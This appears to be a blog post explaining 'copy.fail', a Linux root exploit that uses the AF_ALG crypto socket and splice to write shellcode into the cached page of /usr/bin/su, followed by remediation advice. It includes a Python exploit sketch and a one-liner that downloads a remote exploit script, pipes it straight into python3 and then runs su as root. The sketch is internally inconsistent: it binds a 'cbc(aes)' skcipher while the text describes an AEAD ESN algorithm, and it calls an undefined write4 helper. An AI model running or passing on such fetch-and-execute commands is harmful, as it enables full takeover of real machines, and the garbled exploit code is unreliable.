+++
title = "copy.fail: Four Bytes of Scratch Data and You're Root"
date = "2026-07-15"
+++

A compact 732-byte Python script surfaced recently that achieves reliable root privilege escalation across almost every mainstream Linux distribution released since 2017. The exploit does not require defeating KASLR or winning tight race conditions. Instead, it abuses an architectural optimization inside the kernel's cryptographic subsystem to overwrite read-only page-cache memory.

## The AF_ALG interface and scatterlists

The vulnerability sits inside `AF_ALG`, the socket-based interface to the kernel crypto API. Applications open an `AF_ALG` socket, bind it to an algorithm name, and let the kernel perform the cryptographic operations. For authenticated encryption with associated data (AEAD), data must arrive in order: associated data (AAD), followed by ciphertext, followed by the authentication tag.

In the kernel, these operations are managed using scatterlists, which are linked lists of memory pages with specific offsets and lengths. When user space calls `sendmsg`, its memory pages populate an input scatterlist. Normally, the kernel allocates separate pages for an output scatterlist, where completed results are placed for user space to read back.

## The out-of-bounds scratch write

In 2017, the kernel introduced an optimization to avoid an extra page allocation by pointing the output scatterlist directly at the input page holding the plaintext and authentication tag. While safe for standard operations, one specific IPsec algorithm using extended sequence numbers (ESN) requires a four-byte scratch buffer to compute its HMAC. The crypto engine writes this four-byte scratch value immediately after the tag region, spilling past the allocated boundary of the input page.

This creates a controlled four-byte out-of-bounds write primitive. Crucially, callers do not have to provide the target page directly via `sendmsg`. Using `splice`, an application can pipe existing file pages directly into the crypto socket:

```python
alg = socket(AF_ALG, SOCK_SEQPACKET)
alg.bind(("skcipher", "cbc(aes)"))        # encryption setup
alg.setsockopt(SOL_ALG, ALG_SET_KEY, key)
req = alg.accept()                         # request socket

req.sendmsg(aad + ciphertext)              # AAD + data into input scatterlist
# splice page-cache pages for su instead of a normal tag:
su_fd = os.open("/usr/bin/su", os.O_RDONLY)
pipe_fd = os.pipe()
# splice pipe connects su_fd into crypto socket:
# the page-cache page of /usr/bin/su is appended to the scatterlist
# crypto engine writes 4-byte ESN scratch into su's cached page
write4(target_fd, offset, b"AAAA")         # repeated in 4-byte increments
```

When `splice` moves the file descriptor into the crypto socket, it appends the actual page-cache page of `/usr/bin/su` to the scatterlist. The four bytes of ESN scratch data land directly inside the cached copy of `su` in kernel memory.

Because `splice` supports an offset parameter, an attacker can advance through the target binary four bytes at a time, replacing the in-memory image of `su` with shellcode.

## Code execution via page cache

The binary on disk is never modified. When any process calls `su`, the kernel serves execution directly from the modified page cache. Because `/usr/bin/su` retains its setuid-root permissions in the filesystem metadata, the injected shellcode executes immediately with root privileges:

```bash
curl -s https://copy.fail/exploit.py | python3 - ; su -c id
# returns uid=0(root) without prompting for a password
```

## Remediation

Mainline kernel commit A664B reverts the 2017 in-place optimization, preventing input and output scatterlists from aliasing each other. On systems where kernel updates cannot be applied immediately, blacklisting the AEAD crypto modules stops the socket interface from being instantiated. If crypto support is compiled directly into the kernel image, upgrading to a patched kernel release is required.
